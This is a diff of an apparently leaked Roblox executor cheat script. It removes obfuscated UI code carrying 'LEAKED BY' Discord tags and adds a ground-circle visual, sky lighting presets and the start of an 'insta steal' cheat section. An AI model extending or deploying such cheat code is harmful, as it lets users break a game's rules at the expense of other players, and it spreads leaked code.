(a.MouseEnter:Connect(function()up_27(a,0.12,{BackgroundTransparency=0});end));up_28 (a.MouseLeave:Connect(function()up_27(a,0.12,{BackgroundTransparency=0.35});end));up_28 (a.MouseButton1Click:Connect(function()A(false);l(W,true);if R then R();end;if up_29 then up_29 ("WebSocket","Switching to "..T.."...",3);end;end));end;up_28 (K.MouseButton1Click:Connect(function()if not P or N then return;end;A(not d);if J then J();end;end));up_24.wsRegionText=r();S();getgenv().__kawaifu_on_region_trouble=function()if up_29 then pcall(up_29 ,"WebSocket","Connection trouble \226\128\148 click the status tab (top) to switch edge",8);end;end;local H,a,L,W,T=up_30.regions,up_30.scheme or"ws",(up_30.path or""):gsub("/ws$",""),{};local d,M,C={};local V=os.clock();local F=false;local U=0;local q=up_31.TouchEnabled;local m,Q=q and(math.max(up_19.LatProbeSweepSecs,#H*(up_19.LatProbeTimeout+0.5)))or up_19.LatProbeSweepSecs,q and up_19.LatProbeOnTouch==false and getgenv().KWProbeEdges~=true;local function c(g)local b={streakId=nil,streakSince=nil,doSwitch=false,deferSwitch=false,doPopup=false};if not g.bestId or not g.curTotal or g.curState~="ok"then return b;end;if g.autoPick and not g.earlyDone and g.now-g.injectAt<=up_19.LatEarlyWindow then local i=math.max(up_19.LatSwitchMarginMs,g.curTotal*up_19.LatSwitchMarginPct);if g.bestTotal<g.curTotal-i then if g.joining then b.deferSwitch=true;else b.doSwitch=true;return b;end;end;end;if g.bestTotal<g.curTotal then b.streakId=g.bestId;b.streakSince=g.streakId==g.bestId and g.streakSince or g.now;local i=g.popupLast[g.bestId];if g.now-b.streakSince>=up_19.LatBetterStreak and(not i or g.now-i>=up_19.LatPopupCooldown)then b.doPopup=true;end;end;return b;end;local function g(b)if not T then return nil;end;local i=os.clock()-T.receivedAt+T.asof;if i>up_19.LatServerDead then return nil;end;local t=T.regions[b];if not t then return nil;end;return t,i>up_19.LatServerStale and"stale"or"ok";end;local function b(i)local t=W[i];if t and(t.fails or 0)>=2 then return nil,"offline";end;if not t or not t.ewma or not t.lastOk or os.clock()-t.lastOk>4.5*m then return nil,"measuring";end;local Z,D=g(i);if not Z then return nil,"measuring";end;return math.floor(t.ewma+Z+0.5),D;end;local function i(t)local Z=math.clamp(t/150,0,1);if Z<0.5 then return up_21.Good:Lerp(up_21.Warn,Z*2);end;return up_21.Warn:Lerp(up_21.Bad,(Z-0.5)*2);end;J=function()local t,Z=tostring(getgenv().KaWaifuActiveRegion or""),{};for D,X in ipairs(H)do D=s[X.id];if D then local n,f=b(X.id);if n then D.Text=tostring(n).."ms";elseif f=="offline"then D.Text="offline";D.TextColor3=up_21.Bad;else D.Text=Q and""or"\226\128\166";D.TextColor3=up_21.TextDim;end;local D,Y=y[X.id],h[X.id];if D and Y then local G=E[X.id];if G then G.Transparency=X.id==t and 0.15 or 1;end;if n then Z[#Z+1]={id=X.id,total=n,stale=f~="ok"};else D.LayoutOrder=(f=="offline"and 200 or 100)+(_[X.id]or 0);Y.Text="\226\128\147";Y.TextColor3=f=="offline"and up_21.Bad or up_21.TextDim;end;end;end;end;table.sort(Z,function(E,D)if E.total~=D.total then return E.total<D.total;end;return(_[E.id]or 0)<(_[D.id]or 0);end);t=Z[1]and Z[1].total;for _,E in ipairs(Z)do local Z,D,X,n=y[E.id],h[E.id],s[E.id],i(E.total-t);Z.LayoutOrder=_;D.Text=tostring(_);D.TextColor3=n;X.TextColor3=E.stale and up_21.Warn or n;end;end;R=function()M,C,d=nil,nil,{};end;up_24.latOnServerTable=function(s,y)if type(s)~="table"then return;end;local h={};for _,E in pairs(s)do local s=tonumber(E);if type(_)=="string"and s and s>=0 and s<=60000 then h[_]=s;end;end;T={regions=h,receivedAt=os.clock(),asof=math.max(0,tonumber(y)or 0)};J();end;local function s(y)if getgenv().KWProbeEdges==false or Q then return;end;local h=y.id;local _=y.host;local E=y.port;if not _ or not up_32 then return;end;local y=W[h];if not y then y={fails=0};W[h]=y;end;if y.inflight and os.clock()-y.inflight<2*m+up_19.LatProbeTimeout then return;end;local h=os.clock();y.inflight=h;task.spawn(function()local R,Q=pcall(up_32,a.."://".._..":"..tostring(E)..L.."/probe");if not R or not Q then if y.inflight==h then y.inflight=nil;end;return;end;local a,L,_=false;local E,i=0;i=Q.OnMessage:Connect(function()local t=os.clock();if _ then local Z=t-_;local D=not L or Z<L;if D then L=Z;end;end;E+=1;t=E;if t>=2 then a=true;else _=os.clock();pcall(function()Q:Send("2");end);end;end);_=os.clock();pcall(function()Q:Send("1");end);R=os.clock()+up_19.LatProbeTimeout;while not a and os.clock()<R do task.wait(0.05);end;if i then pcall(function()i:Disconnect();end);end;pcall(function()Q:Close();end);R=y.inflight==h;if R then y.inflight=nil;end;if a and L then local a=L*500;y.ewma=y.ewma and 0.4*a+0.6*y.ewma or a;y.lastOk=os.clock();y.fails=0;elseif R then y.fails=(y.fails or 0)+1;end;end);end;local function a()if os.clock()-U<60 then return;end;U=os.clock();local L=up_33.LatencyCache;if type(L)~="table"then L={};up_33.LatencyCache=L;end;local y=false;for h,h in ipairs(H)do local _,E=W[h.id],g(h.id);if _ and _.ewma and E and(_.fails or 0)<2 and _.lastOk and os.clock()-_.lastOk<=4.5*m then L[h.id]={u=math.floor(_.ewma+0.5),s=math.floor(E+0.5),t=os.time()};y=true;end;end;if y then pcall(up_34 );end;end;local function L()local y=tostring(getgenv().KaWaifuActiveRegion or"");local h,_=b(y);local E,R;for U,U in ipairs(H)do if U.id~=y then local Q,g=b(U.id);if Q and g=="ok"and(not E or Q<E)then E,R=Q,U;end;end;end;local U=false;if up_26.isJoining then local Q,g=pcall(up_26.isJoining);U=Q and g==true;end;local Q=c({now=os.clock(),curTotal=h,curState=_,bestId=R and R.id or nil,bestTotal=E,streakId=M,streakSince=C,popupLast=d,earlyDone=F,injectAt=V,autoPick=up_33.AutoPickWS,joining=U});M,C=Q.streakId,Q.streakSince;if Q.deferSwitch then V+=m;elseif Q.doSwitch and R then F=true;l(R.id,false);if up_29 then pcall(up_29 ,"WebSocket","Auto-pick: switching to "..(R.label or R.id).." ("..E.." ms)...",4);end;elseif Q.doPopup and R then d[R.id]=os.clock();if up_29 then pcall(up_29 ,"Better websocket available",(R.label or R.id).." \226\128\148 "..E.." ms  (current: "..(r()or y).." \226\128\148 "..h.." ms). You can switch in the WS tab.",8);end;end;end;task.spawn(function()task.wait(q and 22 or 2);while up_35 do local y=m/math.max(1,#H);for h,h in ipairs(H)do if not up_35 then return;end;local _=false;if q and up_26.isJoining then local E,R=pcall(up_26.isJoining);_=E and R==true;end;if not _ then s(h);end;task.wait(y);end;J();L();a();end;end);(function()local a,L,s,y=os.time(),os.clock(),{};for h,_ in ipairs(H)do h=up_33.LatencyCache[_.id];local E,R,l=type(h)=="table"and(tonumber(h.u)),type(h)=="table"and(tonumber(h.s)),type(h)=="table"and(tonumber(h.t));if E and R and l then h=a-l;if h>=0 and h<=60 then if not W[_.id]then W[_.id]={ewma=E,lastOk=L-h,fails=0};end;s[_.id]=R;y=if not y or h>y then h else y;end;end;end;a=y and not T;if a then T={regions=s,receivedAt=L,asof=y};end;if y then J();end;end)();if up_33.AutoPickWS then j=os.time();o,p=nil;for a,L in ipairs(H)do a=up_33.LatencyCache[L.id];if type(a)=="table"and(tonumber(a.u))and(tonumber(a.s))and(tonumber(a.t))and j-a.t<=up_19.LatCacheMaxAge then local H=a.u+a.s;if not o or H<o then o,p=H,L.id;end;end;end;if p then F=true;if p~=tostring(getgenv().KaWaifuActiveRegion or"")then local H=getgenv().__kawaifu_set_region_session;if H then pcall(H,p);end;up_24.wsRegionText=r();S();end;end;end;else v.Visible=false;end;end;up_36 =function()if P then return nil;end;P,N=true,true;K.Visible=true;local H=up_27(K,0.25,{Position=UDim2.fromOffset(B,I)});H.Completed:Connect(function()if P then N=false;end;end);return H;end;up_37 =function()if A then A(false);end;if not P then return nil;end;P,N=false,true;local I=up_27(K,0.2,{Position=UDim2.fromOffset(B,e)},Enum.EasingStyle.Quad,Enum.EasingDirection.In);I.Completed:Connect(function()if not P then N=false;K.Visible=false;end;end);return I;end;end)()
-	up_38 = slicedfn37
-	up_39 = tbl22
-	up_40 = Frame2
-	up_41 = slicedfn39
-	up_42 = slicedfn31
-	up_43 = slicedfn38
-
-	do
-		local function slicedfn47(B,I,e,H)local a=up_38("TextButton",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,I,0.5,0),Size=UDim2.fromOffset(28,28),BackgroundColor3=e,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text=B,TextColor3=up_39.Text,TextSize=17,ZIndex=3,Parent=up_40});up_41(a,8);up_42 (a.MouseEnter:Connect(function()up_43(a,0.15,{BackgroundColor3=H});end));up_42 (a.MouseLeave:Connect(function()up_43(a,0.15,{BackgroundColor3=e});end));return a;end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local color = Color3.fromRGB
-		local v = 205
-		sliced89 = slicedfn47("×", -10, Color3.fromRGB(170, 62, 78), color(v, 78, 96))
-		sliced90 = slicedfn47("—", -44, tbl22.Element, tbl22.ElementHover)
-	end
+    task.spawn(function()
+        repeat task.wait() until game:IsLoaded()
+        local plrs = game:GetService("Players")
+        local run  = game:GetService("RunService")
+        local lplr = plrs.LocalPlayer
+        local c = Instance.new("Part")
+        c.Name = "HorizonHubRedCircle"
+        c.Shape = Enum.PartType.Cylinder
+        c.Size = Vector3.new(12, 0.1, 12)
+        c.Anchored = true
+        c.CanCollide = false
+        c.CanQuery = false
+        c.CanTouch = false
+        c.CastShadow = false
+        c.Material = Enum.Material.SmoothPlastic
+        c.Color = Color3.fromRGB(255, 45, 48)
+        c.Transparency = 0.4
+        c.Parent = workspace
+        print("[horizonhub] RED CIRCLE CREATED ✓")
+        run.Heartbeat:Connect(function()
+            pcall(function()
+                if not (c and c.Parent) then return end
+                local char = lplr.Character
+                if not char then c.Visible = false; return end
+                local hrp = char:FindFirstChild("HumanoidRootPart")
+                if not hrp then c.Visible = false; return end
+                local rp = RaycastParams.new()
+                rp.FilterDescendantsInstances = {char, c}
+                rp.FilterType = Enum.RaycastFilterType.Exclude
+                local res = workspace:Raycast(hrp.Position, Vector3.new(0, -2000, 0), rp)
+                if res then
+                    local hum = char:FindFirstChildOfClass("Humanoid")
+                    local gy = res.Position.Y + 0.06
+                    if hum then
+                        -- hard clamp: the circle never rises into the player
+                        gy = math.min(gy, hrp.Position.Y - hum.HipHeight - 0.05)
+                    end
+                    c.Visible = true
+                    c.CFrame = CFrame.new(res.Position.X, gy, res.Position.Z)
+                else
+                    local hum = char:FindFirstChildOfClass("Humanoid")
+                    if hum and hum.FloorMaterial ~= Enum.Material.Air then
+                        c.Visible = true
+                        c.CFrame = CFrame.new(hrp.Position.X, hrp.Position.Y - hum.HipHeight - 0.1, hrp.Position.Z)
+                    else
+                        c.Visible = false
+                    end
+                end
+            end)
+        end)
+    end)
 end
 
-do
-	do
-		slicedfn37("Frame", {
-			Position = UDim2.fromOffset(0, topBarHeight),  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			Size = UDim2.new(1, 0, 0, 1),
-			BackgroundColor3 = tbl22.Stroke,
-			BackgroundTransparency = 0.3,
-			BorderSizePixel = 0,
-			ZIndex = 3,
-			Parent = Frame,
-		})
-
-		up_45 = nil
-		slicedfn44 = function(B,I,e)local H=up_45 ;if H then up_45 =nil;if H.finish then H.finish(nil);end;end;up_45 ={move=B,finish=I,began=e};end
-
-		do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local inputChanged = UserInputService.InputChanged
-			local connect2 = inputChanged.Connect
-			up_45 = nil
-			slicedfn31(connect2(inputChanged, function(B)local I=up_45 ;if I and(B.UserInputType==Enum.UserInputType.MouseMovement or B.UserInputType==Enum.UserInputType.Touch)then I.move(B);end;end))
-		end
-	end
-
-	do
-		local inputEnded = UserInputService.InputEnded
-		local connect2 = inputEnded.Connect
-		up_45 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		slicedfn31(connect2(inputEnded, function(B)local I=up_45 ;if I and(B.UserInputType==Enum.UserInputType.MouseButton1 or B.UserInputType==Enum.UserInputType.Touch)then if I.began and B.UserInputType~=I.began then return;end;up_45 =nil;if I.finish then I.finish(B);end;end;end))
-	end
-
-	up_47 = slicedfn31
-	up_48 = flag20
-	up_49 = flag19
-	up_50 = slicedfn44
-
-	do
-		local function slicedfn47(B,I)up_47 (I.InputBegan:Connect(function(I)if up_48 or up_49 then return;end;if I.UserInputType==Enum.UserInputType.MouseButton1 or I.UserInputType==Enum.UserInputType.Touch then local e=I.Position;local H=B.Position;up_50(function(w)local a=w.Position-e;B.Position=UDim2.new(H.X.Scale,H.X.Offset+a.X,H.Y.Scale,H.Y.Offset+a.Y);end,nil,I.UserInputType);end;end));end
-
-		local Frame3 = slicedfn37("Frame", {
-			Name = "DragZone",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			Size = UDim2.new(1, -270, 1, 0),
-			BackgroundTransparency = 1,
-			ZIndex = 3,
-			Parent = Frame2,
-		})
-
-		slicedfn47(Frame, Frame3)
-	end
+task.spawn(function() pcall(function()
+repeat task.wait() until game:IsLoaded()
+local TweenService      = game:GetService("TweenService")
+local Players           = game:GetService("Players")
+local RunService        = game:GetService("RunService")
+local Stats             = game:GetService("Stats")
+local SKY_PRESETS_LIST = {"Off","Night","Aurora","Sunset","Galaxy","Tech","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}
+local SKY_PRESETS = {
+    Off={kind="off"},
+    Night={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140}},
+    Aurora={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150}},
+    Sunset={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110}},
+    Galaxy={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110}},
+    Tech={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180}},
+    Sakura={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170}},
+    ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120}},
+    ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50}},
+    ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150}},
+    Volcanic={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50}},
+    Arctic={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245}},
+    ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140}},
+    Vaporwave={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210}},
+    Toxic={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90}},
+    ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70}},
+    Hellscape={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40}},
+    Heaven={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220}},
+    Storm={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120}},
+    Sunrise={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140}},
+    ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60}},
+    ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230}},
+    Inferno={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50}},
+    ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220}}
+}
+local function _vC3(t) return Color3.fromRGB(t[1],t[2],t[3]) end
+local function _v4mpClearSky()
+    for _,v in ipairs(game:GetService("Lighting"):GetChildren()) do if v:GetAttribute("_AceDuelsSky") then pcall(function() v:Destroy() end) end end
+    local terrain = workspace:FindFirstChildOfClass("Terrain")
+    if terrain then for _,v in ipairs(terrain:GetChildren()) do if v:GetAttribute("_AceDuelsSky") then pcall(function() v:Destroy() end) end end end
 end
-
-local v, Frame2
-
-do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_51 = slicedfn37
-	up_52 = Frame
-	up_53 = slicedfn39
-	up_54 = tbl22
-	up_55 = slicedfn31
-	up_56 = flag20
-	up_57 = flag19
-	up_58 = slicedfn44
-	up_59 = ScreenGui
-	up_60 = minWindowSize  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_3 = x2
-	up_5 = y2
-	up_4 = sliced84
-	up_64 = slicedfn46
-	up_65 = slicedfn30
-	up_66 = sliced85
-	up_67 = tbl23
-
-	up_68 = slicedfn32
-	;(function()local B,I=up_51("TextButton",{AnchorPoint=Vector2.new(1,1),Position=UDim2.new(1,-2,1,-2),Size=UDim2.fromOffset(20,20),BackgroundTransparency=1,Text="",ZIndex=6,Parent=up_52}),{{-5,-5},{-5,-11},{-11,-5}};for e,e in ipairs(I)do up_53(up_51("Frame",{AnchorPoint=Vector2.new(1,1),Position=UDim2.new(1,e[1],1,e[2]),Size=UDim2.fromOffset(4,4),BackgroundColor3=up_54.TextDim,BackgroundTransparency=0.35,BorderSizePixel=0,ZIndex=6,Parent=B}),2);end;up_55 (B.InputBegan:Connect(function(B)if up_56 or up_57 then return;end;if B.UserInputType==Enum.UserInputType.MouseButton1 or B.UserInputType==Enum.UserInputType.Touch then local I=B.Position;local e=up_52.AbsoluteSize.X;local H=up_52.AbsoluteSize.Y;local a=up_52.Position;up_58(function(K)local L=K.Position-I;local I=up_59.AbsoluteSize;local A,P=math.clamp(e+L.X,up_60.X,math.max(up_60.X,I.X)),math.clamp(H+L.Y,up_60.Y,math.max(up_60.Y,I.Y));up_3 =A;up_5 =P;up_4 =up_64(A,P);I,K=up_65();up_52.Size=UDim2.fromOffset(I,K);up_66.Scale=up_4 ;up_52.Position=UDim2.new(a.X.Scale,a.X.Offset+(A-e)/2,a.Y.Scale,a.Y.Offset+(P-H)/2);end,function()up_67.WinSize={w=math.floor(up_3 ),h=math.floor(up_5 )};up_68 ();end,B.UserInputType);end;end));end)()
-
-	do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local Frame3 = slicedfn37("Frame", {
-			Name = "Sidebar",
-			Position = UDim2.fromOffset(0, topBarHeight + 1),
-			Size = UDim2.new(0, sidebarWidth, 1, -(topBarHeight + 1)),
-			BackgroundColor3 = tbl22.Sidebar,
-			BackgroundTransparency = 0.25,
-			BorderSizePixel = 0,
-			ZIndex = 2,
-			Parent = Frame,
-		})  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		slicedfn39(Frame3, 12)
-
-		slicedfn37("Frame", {
-			Position = UDim2.new(1, 0, 0, 0),
-			Size = UDim2.new(0, 1, 1, 0),
-			BackgroundColor3 = tbl22.Stroke,
-			BackgroundTransparency = 0.3,
-			BorderSizePixel = 0,
-			ZIndex = 3,
-			Parent = Frame3,
-		})  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		v = slicedfn37("Frame", {
-			Position = UDim2.fromOffset(0, 10),
-			Size = UDim2.new(1, 0, 1, -30),
-			BackgroundTransparency = 1,
-			ZIndex = 3,
-			Parent = Frame3,
-		})
-
-		slicedfn37("UIListLayout", {
-			Padding = UDim.new(0, 4),
-			SortOrder = Enum.SortOrder.LayoutOrder,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			HorizontalAlignment = Enum.HorizontalAlignment.Center,
-			Parent = v,
-		})
-
-		slicedfn39(slicedfn37("Frame", {
-			AnchorPoint = Vector2.new(0, 1),
-			Position = UDim2.new(0, 12, 1, -12),
-			Size = UDim2.fromOffset(6, 6),
-			BackgroundColor3 = tbl22.Accent,
-			BorderSizePixel = 0,
-			ZIndex = 3,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			Parent = Frame3,
-		}), 3)
-
-		slicedfn37("TextLabel", {
-			AnchorPoint = Vector2.new(0, 1),
-			Position = UDim2.new(0, 24, 1, -8),
-			Size = UDim2.new(1, -30, 0, 14),
-			BackgroundTransparency = 1,
-			Font = Enum.Font.GothamMedium,
-			Text = localPlayer.DisplayName,
-			TextColor3 = tbl22.Accent2,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			TextTransparency = 0.25,
-			TextSize = 13,
-			TextTruncate = Enum.TextTruncate.AtEnd,
-			TextXAlignment = Enum.TextXAlignment.Left,
-			ZIndex = 3,
-			Parent = Frame3,
-		})
-
-		Frame2 = slicedfn37("Frame", {
-			Name = "Indicator",
-			Position = UDim2.fromOffset(0, 19),  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			Size = UDim2.fromOffset(2, 16),
-			BackgroundColor3 = tbl22.Accent,
-			BorderSizePixel = 0,
-			ZIndex = 4,
-			Parent = Frame3,
-		})
-	end
+local function applyCustomSky(mode)
+    _v4mpClearSky()
+    local p = SKY_PRESETS[mode]
+    local Lighting = game:GetService("Lighting")
+    if not p or p.kind=="off" then 
+        Lighting.Brightness=2; Lighting.ClockTime=14; Lighting.GlobalShadows=true; 
+        __HH.currentSkyTheme="Off"; return 
+    end
+    Lighting.ClockTime=p.clock or 14; Lighting.Brightness=p.brightness or 2; 
+    if p.ambient then Lighting.Ambient=_vC3(p.ambient) end; 
+    if p.outAmb then Lighting.OutdoorAmbient=_vC3(p.outAmb) end
+    local atm=Instance.new("Atmosphere"); atm:SetAttribute("_AceDuelsSky",true); atm.Density=0.35; atm.Color=Lighting.Ambient; atm.Decay=Lighting.OutdoorAmbient; atm.Parent=Lighting
+    local sky=Instance.new("Sky"); sky:SetAttribute("_AceDuelsSky",true); sky.StarCount=(mode=="Galaxy" or mode=="Deep Space") and 10000 or 2000; sky.Parent=Lighting
+    __HH.currentSkyTheme=mode
 end
+end) end)
 
-slicedfn39(Frame2, 1)
-
-do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	local Frame3 = slicedfn37("Frame", {
-		Name = "Content",
-		Position = UDim2.fromOffset(sidebarWidth + 1, topBarHeight + 1),
-		Size = UDim2.new(1, -(sidebarWidth + 1), 1, -(topBarHeight + 1)),
-		BackgroundTransparency = 1,
-		ClipsDescendants = true,
-		ZIndex = 2,
-		Parent = Frame,
-	})
-
-	local tbl26 = {}  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_69 = nil
-	up_70 = tbl26
-	up_71 = slicedfn38
-	up_72 = tbl22
-	up_73 = Frame2
-	slicedfn45 = function(B)if up_69 ==B then return;end;up_69 =B;for I,e in ipairs(up_70)do local H=I==B;e.page.Visible=H;up_71(e.button,0.2,{TextColor3=H and up_72.Accent or up_72.TextDim,BackgroundTransparency=H and 0.65 or 1});if H then e.page.Position=UDim2.fromOffset(10,8);up_71(e.page,0.25,{Position=UDim2.fromOffset(0,8)});up_71(up_73,0.25,{Position=UDim2.fromOffset(0,10+(I-1)*38+9)});end;end;end
-	up_74 = tbl26
-	up_75 = slicedfn37
-	up_76 = tbl22
-	up_77 = v  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_78 = slicedfn39
-	up_79 = Frame3
+-- insta steal
+task.spawn(function() pcall(function()
+repeat task.wait() until game:IsLoaded()
+local TweenService      = game:GetService("TweenService")
+local Players           = game:GetService("Players")
+local RunService        = game:GetService("RunService")
+local UserInputService  = game:GetService("UserInputService")
+local CoreGui           = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Stats             = game:GetService("Stats")
+local LP = Players.LocalPlayer
+if _G.InstaStealConn then
+    pcall(function() _G.InstaStealConn:Disconnect() end)
+    _G.InstaStealConn = nil
 end
-
-local slicedfn46, slicedfn47, slicedfn48, slicedfn49, slicedfn50, slicedfn51, slicedfn52, slicedfn53, slicedfn54, slicedfn55
-local slicedfn56, slicedfn57, slicedfn58, slicedfn59, slicedfn60
-
-do
-	do
-		local tbl26, tbl27, tbl28, tbl29, tbl30, tbl31, flag21, slicedfn61, slicedfn62, slicedfn63
-
-		do
-			local slicedfn64  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-			do
-				up_80 = slicedfn31
-				up_81 = nil
-				up_82 = slicedfn38
-				up_83 = slicedfn45
-				slicedfn46 = function(B,I)I=I or{};local e=#up_74+1;local H=up_75("TextButton",{Name="Tab_"..B,Size=UDim2.new(1,-16,0,34),BackgroundColor3=up_76.Element,BackgroundTransparency=1,AutoButtonColor=false,Font=Enum.Font.GothamMedium,Text=B,TextColor3=up_76.TextDim,TextSize=16,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=e,ZIndex=3,Parent=up_77});up_78(H,8);up_75("UIPadding",{PaddingLeft=UDim.new(0,12),Parent=H});local a=if I.scroll==false then(up_75("Frame",{Name="Page_"..B,Position=UDim2.fromOffset(0,8),Size=UDim2.new(1,-6,1,-16),BackgroundTransparency=1,ClipsDescendants=true,Visible=false,ZIndex=2,Parent=up_79}))else(up_75("ScrollingFrame",{Name="Page_"..B,Position=UDim2.fromOffset(0,8),Size=UDim2.new(1,-6,1,-16),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,ScrollBarImageColor3=up_76.Accent,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,Visible=false,ZIndex=2,Parent=up_79}));up_75("UIListLayout",{Padding=UDim.new(0,8),SortOrder=Enum.SortOrder.LayoutOrder,Parent=a});up_75("UIPadding",{PaddingLeft=UDim.new(0,14),PaddingRight=UDim.new(0,14),PaddingTop=UDim.new(0,6),PaddingBottom=UDim.new(0,10),Parent=a});up_80 (H.MouseEnter:Connect(function()if up_81 ~=e then up_82(H,0.15,{TextColor3=up_76.Text});end;end));up_80 (H.MouseLeave:Connect(function()if up_81 ~=e then up_82(H,0.15,{TextColor3=up_76.TextDim});end;end));up_80 (H.MouseButton1Click:Connect(function()up_83(e);end));up_74[e]={button=H,page=a};return a;end
-				slicedfn47 = function(w)local B=(w:GetAttribute("elemCount")or 0)+1;w:SetAttribute("elemCount",B);return B;end
-				up_84 = slicedfn37
-				up_85 = slicedfn47
-				up_86 = tbl22  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				slicedfn48 = function(B,I)local e=up_84("Frame",{Size=UDim2.new(1,0,0,24),BackgroundTransparency=1,LayoutOrder=up_85(B),ZIndex=2,Parent=B});up_84("TextLabel",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text=I,TextColor3=up_86.Accent2,TextSize=16,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=e});up_84("Frame",{AnchorPoint=Vector2.new(0,1),Position=UDim2.new(0,0,1,-2),Size=UDim2.new(1,0,0,1),BackgroundColor3=up_86.Stroke,BackgroundTransparency=0.4,BorderSizePixel=0,ZIndex=2,Parent=e});return e;end
-				up_87 = slicedfn37
-				up_88 = tbl22
-				up_89 = slicedfn47
-				slicedfn49 = function(B,I)return up_87("TextLabel",{Size=UDim2.new(1,0,0,20),BackgroundTransparency=1,Font=Enum.Font.Gotham,Text=I,TextColor3=up_88.TextDim,TextSize=15,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=up_89(B),ZIndex=2,Parent=B});end
-				up_90 = tbl22
-				up_91 = slicedfn37
-				up_92 = slicedfn47
-				up_93 = slicedfn39
-				up_94 = slicedfn31  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				up_95 = slicedfn38
-				slicedfn50 = function(B,I,e,H)H=H or{};local a=H.baseColor or up_90.Element;local K=H.hoverColor or up_90.ElementHover;local L=H.flashColor or up_90.Accent;local A=up_91("TextButton",{Size=H.size or(UDim2.new(1,0,0,34)),BackgroundColor3=a,AutoButtonColor=false,Font=Enum.Font.GothamMedium,Text=I,TextColor3=H.textColor or up_90.Text,TextSize=16,LayoutOrder=H.layoutOrder or(up_92(B)),ZIndex=2,Parent=H.parent or B});up_93(A,8);local B=up_91("UIStroke",{ApplyStrokeMode=Enum.ApplyStrokeMode.Border,Color=up_90.Stroke,Transparency=0.4,Thickness=1,Parent=A});local I=false;up_94 (A.MouseEnter:Connect(function()I=true;up_95(A,0.15,{BackgroundColor3=K});up_95(B,0.15,{Color=up_90.Accent,Transparency=0.45});end));up_94 (A.MouseLeave:Connect(function()I=false;up_95(A,0.15,{BackgroundColor3=a});up_95(B,0.15,{Color=up_90.Stroke,Transparency=0.4});end));up_94 (A.MouseButton1Click:Connect(function()up_95(A,0.08,{BackgroundColor3=L});task.delay(0.08,function()if A.Parent then up_95(A,0.25,{BackgroundColor3=I and K or a});end;end);if e then task.spawn(e);end;end));return A;end
-				up_96 = slicedfn37
-				up_97 = slicedfn47
-				up_98 = slicedfn50
-				slicedfn51 = function(B,I)local e=up_96("Frame",{Size=UDim2.new(1,0,0,34),BackgroundTransparency=1,LayoutOrder=up_97(B),ZIndex=2,Parent=B});up_96("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder,Parent=e});local H,a=#I,{};for K,L in ipairs(I)do local I=up_98(B,L.text,L.callback,{parent=e,layoutOrder=K,size=UDim2.new(1/H,-(6*(H-1)/H),1,0),baseColor=L.baseColor,hoverColor=L.hoverColor,flashColor=L.flashColor,textColor=L.textColor});if L.rich then I.RichText=true;end;a[K]=I;end;return a;end
-				up_99 = slicedfn37
-				up_100 = tbl22
-				up_101 = slicedfn47
-				up_102 = slicedfn39  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				up_103 = slicedfn38
